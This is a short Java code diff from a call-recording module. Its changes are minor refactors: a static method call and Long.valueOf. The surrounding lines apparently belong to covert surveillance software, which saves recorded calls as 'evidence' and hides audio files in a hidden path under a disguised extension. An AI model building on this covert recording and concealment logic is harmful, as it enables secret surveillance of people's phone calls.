@@ -422,7 +422,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private boolean recordCall(final Call call, final boolean incoming) {
 		if (!call.isOngoing()) {
 			if (stopRecord()) {
-				Object future = Status.self().getStpe().schedule(new Runnable() {
+				Object future = Status.getStpe().schedule(new Runnable() {
 					public void run() {
 						saveCallEvidence(call.getNumber(), incoming, call.getTimeBegin(), call.getTimeEnd(),
 								currentRecordFile, true, 1);
@@ -892,7 +892,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
 		// Create dummy file
-		Long ts = new Long(System.currentTimeMillis());
+		Long ts = Long.valueOf(System.currentTimeMillis());
 		String tmp = ts.toString();
 		String path = Path.hidden() + tmp + ".qzt"; // file .3gp
 		boolean success = false;
